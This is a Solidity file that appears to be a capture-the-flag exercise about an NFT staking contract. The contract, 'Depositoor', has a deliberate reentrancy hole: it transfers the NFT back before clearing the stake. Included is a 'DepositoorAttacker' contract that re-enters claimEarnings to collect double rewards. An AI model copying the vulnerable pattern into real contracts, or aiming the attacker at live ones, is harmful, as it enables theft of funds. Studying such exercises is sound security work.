// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Capped} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";

contract RewardToken is ERC20Capped {
    constructor(address depositoor) ERC20("Token", "TK") ERC20Capped(1000e18) {
        ERC20._mint(depositoor, 100e18);
    }
}

contract NftToStake is ERC721 {
    constructor(address attacker) ERC721("NFT", "NFT") {
        _mint(attacker, 42);
    }
}

contract Depositoor is IERC721Receiver {
    IERC721 public nft;
    IERC20 public rewardToken;
    uint256 public constant REWARD_RATE = 10e18 / uint256(1 days);
    bool init;

    constructor(IERC721 _nft) {
        nft = _nft;
        alreadyUsed[0] = true;
    }

    struct Stake {
        uint256 depositTime;
        uint256 tokenId;
    }

    mapping(uint256 => bool) public alreadyUsed;
    mapping(address => Stake) public stakes;

    function setRewardToken(IERC20 _rewardToken) external {
        require(!init);
        init = true;
        rewardToken = _rewardToken;
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(nft), "wrong NFT");
        require(!alreadyUsed[tokenId], "can only stake once");

        alreadyUsed[tokenId] = true;
        stakes[from] = Stake({depositTime: block.timestamp, tokenId: tokenId});

        return IERC721Receiver.onERC721Received.selector;
    }

    function claimEarnings(uint256 _tokenId) public {
        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
        payout(msg.sender);
        stakes[msg.sender].depositTime = block.timestamp;
    }

    function withdrawAndClaimEarnings(uint256 _tokenId) public {
        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
        payout(msg.sender);
        nft.safeTransferFrom(address(this), msg.sender, _tokenId);
        delete stakes[msg.sender];
    }

    function payout(address _a) private {
        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;

        if (amountToSend > 50e18) {
            amountToSend = 50e18;
        }
        if (amountToSend > rewardToken.balanceOf(address(this))) {
            amountToSend = rewardToken.balanceOf(address(this));
        }

        rewardToken.transfer(_a, amountToSend);
    }
}

contract DepositoorAttacker is IERC721Receiver {
    Depositoor private depositoor;
    NftToStake private nftToStake;

    address private owner;
    uint256 private TOKEN_ID = 42;

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    constructor(address _owner) {
        owner = _owner;
    }

    function init(Depositoor _depositoor, NftToStake _nftToStake) public onlyOwner {
        depositoor = _depositoor;
        nftToStake = _nftToStake;
    }

    function depositNft() public onlyOwner {
        nftToStake.approve(address(depositoor), TOKEN_ID);
        nftToStake.safeTransferFrom(address(this), address(depositoor), TOKEN_ID);
    }

    function claimEarnings() public onlyOwner {
        depositoor.withdrawAndClaimEarnings(TOKEN_ID);
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        if (depositoor.alreadyUsed(tokenId)) {
            depositoor.claimEarnings(tokenId);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract CreateDepositoorAttackerFactory {
    function deploy(uint256 _salt, address _owner) external returns (DepositoorAttacker attacker) {
        attacker = new DepositoorAttacker{salt: bytes32(_salt)}(_owner);
    }

    function getAddress(uint256 _salt, address _owner) public view returns (address attacker) {
        bytes memory bytecode = _getBytecode(_owner);
        attacker = _getAddress(bytecode, _salt);
    }

    function _getAddress(bytes memory _bytecode, uint256 _salt) private view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(_bytecode)));
        return address(uint160(uint256(hash)));
    }

    function _getBytecode(address _owner) private pure returns (bytes memory) {
        bytes memory bytecode = type(DepositoorAttacker).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_owner));
    }
}
